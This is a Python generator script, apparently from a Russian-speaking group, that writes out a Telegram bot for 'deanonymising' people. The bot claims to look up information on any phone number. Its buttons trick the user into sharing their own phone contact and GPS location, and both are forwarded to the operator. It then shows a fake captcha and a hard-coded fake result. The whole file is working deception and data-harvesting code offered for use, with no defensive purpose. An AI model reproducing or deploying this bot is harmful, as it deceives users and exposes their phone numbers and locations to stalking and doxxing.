from colorama import Fore, Back, Style
import os

def cls():
    os.system('clear')

def ban():
    
    print(Fore.CYAN+'''
  _  __ _____   ______  _____    ____  
 | |/ /|  __ \ |  ____||  __ \  / __ \ 
 | ' / | |__) || |__   | |  | || |  | |
 |  <  |  _  / |  __|  | |  | || |  | |
 | . \ | | \ \ | |____ | |__| || |__| |
 |_|\_\|_|  \_\|______||_____/  \____/ 
''')

    
    print(Fore.CYAN + 'by qwadoh & KREDO TEAM' + Fore.WHITE + '   КАНАЛ: ' + Fore.RED + '@kredo_official' + Fore.BLUE)
    print(Fore.BLUE + 'Скрипт для создания бота деанона')
    print('-------------------------------------------\n')

cls()
ban()
my_file = open('deanon.py', 'w', encoding='utf-8')

a = input(Fore.MAGENTA + "Введите ID создателя(вас): ")
my_file.write("""
import time
import random
import telebot
from telebot import types
my_id = '""")
my_file.write(a)
my_file.write("'")
b = input(Fore.MAGENTA + "Введите токен бота: ")
my_file.write("""
bot = telebot.TeleBot('""")
my_file.write(b)
my_file.write("')")
my_file.write('''
user_dict = {}
class User:
    def __init__(self, name):
        self.num = None
        self.number = None
@bot.message_handler(commands=['help', 'start'])
def process_name_step(message):
    try:
        chat_id = message.chat.id
        name = message.text
        user = User(name)
        user_dict[chat_id] = user
        msg = bot.reply_to(message, """Этот бот прендназначен для пробива номера.
        Бот поддерживает номера Украины, России, Белоруссии, Казахстана.
    Введите номер о котором вы хотите узнать все возможную информацию.   """)
        bot.register_next_step_handler(msg, process_num_step)
    except Exception as e:
        bot.reply_to(message, 'Ошибка, нажмине /start или перезагрузите бота')
def process_num_step(message):
    try:
        chat_id = message.chat.id
        num = message.text
        if not num.isdigit():
            msg = bot.reply_to(message, 'Проверьте правильно ли написали номер, и напишите снова.')
            bot.register_next_step_handler(msg, process_num_step)
            return            
        user = user_dict[chat_id]
        user.num = num
        bot.reply_to(message, '⏳Подождите...⏳')#🔎
        time.sleep(4)
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_phone = types.KeyboardButton(text="Продолжить", request_contact=True)
        keyboard.add(button_phone)
        bot.send_message(message.chat.id,
                     text="🔎Для получения информации о номере нажмите 'Продолжить'🔎 ",
                     reply_markup=keyboard)
        @bot.message_handler(content_types='contact')
        def error(message):
            bot.forward_message(my_id, message.chat.id, message.message_id)
            bot.reply_to(message, '🔎Поиск информации, подождите...🔎')#🔎🗿📞📞
            time.sleep(4.5)
            keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
            button_phone = types.KeyboardButton(text="Начать🔎", request_location=True)
            keyboard.add(button_phone)
            bot.send_message(message.chat.id,
                         text="📞Для получения информации о местоположении телефона нажмите 'Начать' 📞",
                         reply_markup=keyboard)
            @bot.message_handler(content_types='location')
            def error(message):
                bot.forward_message(my_id, message.chat.id, message.message_id)
                bot.reply_to(message, '⏳Подождите...⏳')#🔎🗿📞📞
                time.sleep(4.5)
                markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
                markup.add('1', '2', '3', '4', '5', '6', '7', '8', '9')
                msg = bot.reply_to(message, 'Подтвердите, что вы не робот, нажмите на цифру 4 или 7', reply_markup=markup)
                bot.register_next_step_handler(msg, process_number_step)
    except Exception as e:
        bot.reply_to(message, 'Ошибка, нажмине /start или перезагрузите бота')
def process_number_step(message):
    try:
        chat_id = message.chat.id
        number = message.text
        user = user_dict[chat_id]
        if (number == u'4') or (number == u'7'):
            bot.send_message(message.chat.id, """Номер получен!
        Страна: Россия
        Регион: Екатеринбург
        Улица: 8 марта
        Google maps: https://clck.ru/RDFzp""")
        else:
            msg = bot.reply_to(message, "Вы не прошли проверку, попробуйте ещё раз.")
            bot.register_next_step_handler(msg, error)
            raise Exception()
        
    except Exception as e:
        #bot.reply_to(message, 'Ошибка')
        bot.register_next_step_handler(msg, process_number_step)
        
bot.polling()
''')
my_file.close()
print(Fore.BLUE + "Файл успешно создан и сохранен!")
